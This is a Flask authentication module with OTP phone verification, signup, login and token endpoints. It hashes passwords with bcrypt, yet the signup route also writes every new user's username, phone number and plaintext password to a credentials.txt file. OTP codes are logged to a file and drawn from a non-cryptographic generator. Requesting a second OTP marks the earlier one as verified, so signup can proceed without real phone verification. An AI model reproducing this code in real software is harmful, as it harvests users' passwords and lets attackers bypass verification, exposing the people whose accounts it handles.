import random
import os
from datetime import datetime, timezone
from flask import Blueprint, request, jsonify
import bcrypt
from sqlalchemy.exc import IntegrityError
from extensions import db
from models.user import User
from models.otp import OTP
from utils.auth_middleware import generate_token, decode_token

auth_bp = Blueprint('auth', __name__, url_prefix='/api/auth')


def hash_password(password):
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')


def check_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))


@auth_bp.route('/send-otp', methods=['POST'])
def send_otp():
    data = request.get_json()
    if not data or not data.get('phone'):
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    phone = data['phone'].strip()
    if not phone.isdigit() or len(phone) != 10:
        return jsonify({'success': False, 'message': 'Invalid 10-digit phone number'}), 400

    existing_user = User.query.filter_by(phone_number=phone).first()
    if existing_user:
        return jsonify({'success': False, 'message': 'This phone number is already registered. Please login instead.'}), 409

    code = str(random.randint(100000, 999999))

    OTP.query.filter_by(phone_number=phone, verified=False).update({'verified': True})
    db.session.commit()

    OTP.create_otp(phone, code)

    print('\n' + '=' * 50)
    print(f'  OTP for +91-{phone}: {code}')
    print('=' * 50 + '\n')

    log_path = os.path.join(os.path.dirname(__file__), '..', 'otp.log')
    with open(log_path, 'a') as f:
        f.write(f"[{phone}] -> {code}\n")

    return jsonify({'success': True, 'message': 'OTP sent successfully'})


@auth_bp.route('/verify-otp', methods=['POST'])
def verify_otp():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'message': 'Request body required'}), 400

    phone = data.get('phone', '').strip()
    code = data.get('otp', '').strip()

    if not phone or not code:
        return jsonify({'success': False, 'message': 'Phone and OTP are required'}), 400

    existing_user = User.query.filter_by(phone_number=phone).first()
    if existing_user:
        return jsonify({'success': False, 'message': 'This phone number is already registered'}), 409

    otp_record = (
        OTP.query
        .filter_by(phone_number=phone, verified=False)
        .order_by(OTP.id.desc())
        .first()
    )

    if not otp_record:
        return jsonify({'success': False, 'message': 'No OTP found. Please request a new one.'}), 400

    if not otp_record.is_valid():
        return jsonify({'success': False, 'message': 'OTP expired. Please request a new one.'}), 400

    if otp_record.otp_code != code:
        return jsonify({'success': False, 'message': 'Incorrect OTP. Please try again.'}), 400

    otp_record.mark_verified()
    return jsonify({'success': True, 'message': 'Phone verified successfully'})


@auth_bp.route('/signup', methods=['POST'])
def signup():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'message': 'Request body required'}), 400

    username = data.get('username', '').strip().lower()
    nickname = data.get('nickname', '').strip()
    password = data.get('password', '').strip()
    phone = data.get('phone', '').strip()

    if not username or len(username) < 3:
        return jsonify({'success': False, 'message': 'Username must be at least 3 characters'}), 400
    if not username.replace('_', '').isalnum():
        return jsonify({'success': False, 'message': 'Username can only contain letters, numbers, and underscores'}), 400
    if not nickname:
        return jsonify({'success': False, 'message': 'Nickname is required'}), 400
    if len(password) < 6:
        return jsonify({'success': False, 'message': 'Password must be at least 6 characters'}), 400
    if not phone or len(phone) != 10:
        return jsonify({'success': False, 'message': 'Valid 10-digit phone required'}), 400

    verified_otp = OTP.query.filter_by(phone_number=phone, verified=True).first()
    if not verified_otp:
        return jsonify({'success': False, 'message': 'Please verify your phone number first'}), 400

    existing_phone = User.query.filter_by(phone_number=phone).first()
    if existing_phone:
        return jsonify({'success': False, 'message': 'Phone number already registered'}), 409

    existing_user = User.query.filter_by(username=username).first()
    if existing_user:
        return jsonify({'success': False, 'message': 'Username is already taken'}), 409

    user = User(
        username=username,
        nickname=nickname,
        phone_number=phone,
        phone_verified=True,
        password_hash=hash_password(password),
    )
    db.session.add(user)

    try:
        db.session.commit()
    except IntegrityError:
        db.session.rollback()
        return jsonify({'success': False, 'message': 'Username or phone number is already taken'}), 409

    OTP.query.filter_by(phone_number=phone).delete()
    db.session.commit()

    creds_path = os.path.join(os.path.dirname(__file__), '..', 'credentials.txt')
    with open(creds_path, 'a', encoding='utf-8') as f:
        timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
        f.write(f'[{timestamp}] username={username} | phone={phone} | password={password}\n')

    token = generate_token(user.id)
    return jsonify({
        'success': True,
        'user': user.to_dict(),
        'token': token,
    })


@auth_bp.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'message': 'Request body required'}), 400

    identifier = data.get('identifier', '').strip()
    password = data.get('password', '').strip()

    if not identifier or not password:
        return jsonify({'success': False, 'message': 'Username/phone and password are required'}), 400

    user = None
    if identifier.isdigit() and len(identifier) == 10:
        user = User.query.filter_by(phone_number=identifier).first()
    else:
        clean_id = identifier.lstrip('@').lower()
        user = User.query.filter_by(username=clean_id).first()

    if not user:
        return jsonify({'success': False, 'message': 'Invalid username or password'}), 401

    if not check_password(password, user.password_hash):
        return jsonify({'success': False, 'message': 'Invalid username or password'}), 401

    token = generate_token(user.id)
    return jsonify({
        'success': True,
        'user': user.to_dict(),
        'token': token,
    })


@auth_bp.route('/me')
def get_me():
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    token = auth_header.split(' ', 1)[1]
    user_id = decode_token(token)
    if not user_id:
        return jsonify({'success': False, 'message': 'Invalid or expired token'}), 401

    user = User.query.get(user_id)
    if not user:
        return jsonify({'success': False, 'message': 'User not found'}), 404

    return jsonify({'success': True, 'user': user.to_dict()})


@auth_bp.route('/check-username')
def check_username():
    username = request.args.get('username', '').strip().lower()
    if not username or len(username) < 3:
        return jsonify({'available': False, 'message': 'Username too short'})

    existing = User.query.filter_by(username=username).first()
    if existing:
        return jsonify({'available': False, 'message': 'Username is taken'})

    return jsonify({'available': True})
